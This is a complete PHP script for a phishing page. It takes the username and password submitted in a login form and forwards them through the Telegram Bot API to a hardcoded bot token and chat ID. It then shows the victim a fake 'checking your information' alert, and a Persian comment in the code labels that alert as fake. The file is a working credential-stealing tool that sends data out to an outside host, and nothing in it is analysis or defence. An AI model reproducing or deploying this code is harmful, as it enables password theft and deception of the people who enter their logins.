
<?php
$token = "7378263557:AAHkDgjoo66CSdDWoigv7Vc2fs73Nx90h4s";
$chat_id = "6663666967";

$username = $_POST['username'];
$password = $_POST['password'];

$message = "ورود جدید:\nنام کاربری: " . $username . "\nرمز عبور: " . $password;

$url = "https://api.telegram.org/bot$token/sendMessage";

$data = [
  'chat_id' => $chat_id,
  'text' => $message
];

$options = [
  'http' => [
    'method'  => 'POST',
    'header'  => "Content-Type:application/x-www-form-urlencoded",
    'content' => http_build_query($data)
  ]
];

$context  = stream_context_create($options);
file_get_contents($url, false, $context);

// نمایش پیغام تقلبی
echo "<script>alert('در حال بررسی اطلاعات... لطفاً چند لحظه صبر کنید.');</script>";
?>
